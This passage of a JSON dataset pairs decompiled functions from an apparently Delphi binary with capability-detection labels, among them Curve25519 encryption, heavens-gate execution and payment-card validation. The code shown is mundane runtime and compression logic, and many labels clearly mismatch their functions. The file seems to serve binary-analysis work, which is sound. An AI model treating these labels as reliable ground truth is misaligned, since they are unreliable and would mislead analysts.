            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004324e0(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (105 cases) at 0x432566\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1828
    },
    "00451228": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451228(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    puVar1 = *(param_2 + 8);\n    uVar2 = fcn.0040484c(puVar1[2], puVar1[1], *puVar1);\n    *(param_2 + 0xc) = uVar2 & 0x7f;\n    return;\n}\n",
        "token_count": 107
    },
    "00404aac": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404aac(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00404f70": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00404f70(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "0041c504": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c504(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c57b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.0040700c();\n    if (param_2 != 0) {\n        iVar2 = fcn.004164d8();\n        fcn.0040700c(iVar2 + 5);\n        cVar1 = fcn.0040f968();\n        if (cVar1 == '\\0') {\n            fcn.0040700c();\n        }\n    }\n    fcn.00416c70();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41c582;\n    uStack24 = 0x41c57a;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 259
    },
    "00420ffc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420ffc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 49
    },
    "0045ba9c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ba9c(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.0045b924(&stack0xfffffffc);\n        fcn.00432198();\n        cVar1 = fcn.004322a0();\n        if (cVar1 == '\\0') {\n            fcn.0045b9b8(arg_8h[3] + -2, &stack0xfffffffc);\n            fcn.0045b9b8(arg_8h[3] + -2, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045ba40(arg_8h[3] + -2, *arg_8h + 10, &stack0xfffffffc);\n        }\n    }\n    else {\n        fcn.0045b924(&stack0xfffffffc);\n        fcn.00432198();\n        cVar1 = fcn.004322a0();\n        if (cVar1 == '\\0') {\n            fcn.0045b9b8(arg_8h[1] + 5, &stack0xfffffffc);\n            fcn.0045b9b8(arg_8h[1] + 8, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045ba40(arg_8h[1] + 10, (arg_8h[2] - *(in_EAX + 0x18)) + -2, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "00466730": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00466730(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 49
    },
    "004033e0": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nuint fcn.004033e0(void)\n\n{\n    uint32_t in_EAX;\n    \n    *0x48f008 = *0x48f008 * 0x8088405 + 1;\n    return in_EAX * *0x48f008 >> 0x20;\n}\n",
        "token_count": 65
    },
    "0040773c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.0040773c(void)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, in_EAX);\n}\n",
        "token_count": 32
    },
    "00409728": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409728(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 86
    },
    "0048af64": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048af64(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack56 = 0x48af7d;\n    fcn.004059cc();\n    uStack60 = 0x48b042;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x48b015;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uVar4 = 0x104;\n    puStack56 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0, 0x104, &fcn.0048af64::var_ch, &fcn.0048af64::var_10h, &fcn.0048af64::var_14h, 0, 0x104);\n    uVar3 = 0x48afc1;\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA(uVar1);\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            uVar3 = 0;\n            fcn.00409e4c(var_ch);\n        }\n        else {\n            fcn.0040af88(var_8h);\n            uVar3 = var_8h;\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    *in_FS_OFFSET = uVar4;\n    fcn.00405530(0x48b049);\n    return;\n}\n",
        "token_count": 480
    },
    "00403d30": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00403d30(void)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        uVar1 = fcn.00403bcc();\n        if (uVar1 == '\\n') {\n            return;\n        }\n        if (uVar1 >> 8 == '\\x1a') break;\n        if (uVar1 == '\\r') {\n            uVar1 = fcn.00403bcc();\n            if ((uVar1 == '\\n') || (uVar1 >> 8 == '\\x1a')) {\n                return;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00406018": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00406018(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00406018();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fe8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 509
    },
    "00406208": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00406208(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.004030fc();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.00405584();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.00405d64();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.004061f0();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00406324(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00406208();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00407024();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402ff8();\n                return;\n            }\n            fcn.00406970();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 551
    },
    "00406324": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __thiscall fcn.00406324(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.00405584();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.00405d64();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.004061f0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406324();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00406208();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00407024();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n        do {\n            fcn.00406970();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "004727dc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004727dc(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iStack24;\n    uint32_t uStack20;\n    uint16_t *puStack16;\n    \n    uStack20 = 0xffffffff;\n    uVar2 = *(param_2 + 2);\n    iVar7 = 0;\n    iVar4 = 7;\n    iVar3 = 4;\n    if (uVar2 == 0) {\n        iVar4 = 0x8a;\n        iVar3 = 3;\n    }\n    *(param_2 + 6 + param_1 * 4) = 0xffff;\n    puStack16 = param_2 + 6;\n    iStack24 = 0;\n    uVar5 = uVar2;\n    if (-1 < param_1) {\n        do {\n            iVar7 = iVar7 + 1;\n            uVar6 = *puStack16;\n            if ((iVar4 <= iVar7) || (uVar6 != uVar5)) {\n                if (iVar7 < iVar3) {\n                    piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar7;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar7 < 0xb) {\n                        *(in_EAX + 0xabc) = *(in_EAX + 0xabc) + 1;\n                    }\n                    else {\n                        *(in_EAX + 0xac0) = *(in_EAX + 0xac0) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != uStack20) {\n                        piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(in_EAX + 0xab8) = *(in_EAX + 0xab8) + 1;\n                }\n                iVar7 = 0;\n                uStack20 = uVar5;\n                if (uVar6 == 0) {\n                    iVar4 = 0x8a;\n                    iVar3 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar4 = 6;\n                    iVar3 = 3;\n                }\n                else {\n                    iVar4 = 7;\n                    iVar3 = 4;\n                }\n            }\n            iStack24 = iStack24 + 1;\n            puStack16 = puStack16 + 2;\n            uVar5 = uVar6;\n        } while (iStack24 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 647
    },
    "004728e8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004728e8(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iStack48;\n    uint32_t uStack44;\n    uint16_t *puStack20;\n    \n    iVar7 = 4;\n    iVar2 = 7;\n    uStack44 = 0xffffffff;\n    if (*(param_2 + 2) == 0) {\n        iVar2 = 0x8a;\n        iVar7 = 3;\n    }\n    iStack48 = 0;\n    puStack20 = param_2 + 6;\n    iVar3 = 0;\n    uVar5 = *(param_2 + 2);\n    if (-1 < param_1) {\n        do {\n            iVar4 = iVar3 + 1;\n            uVar6 = *puStack20;\n            if ((iVar2 <= iVar4) || (uVar6 != uVar5)) {\n                if (iVar4 < iVar7) {\n                    do {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        uVar8 = *(in_EAX + 0xabe);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xabc);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xabc) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 0xe) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 2U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 2U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n                        }\n                    }\n                    else {\n                        uVar8 = *(in_EAX + 0xac2);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xac0);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xac0) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 10) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -0xb << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 7;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 10U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 10U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -9;\n                        }\n                    }\n                }\n                else {\n                    if (uVar5 != uStack44) {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        iVar4 = iVar3;\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                    }\n                    uVar8 = *(in_EAX + 0xaba);\n                    if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                        uVar1 = *(in_EAX + 0xab8);\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 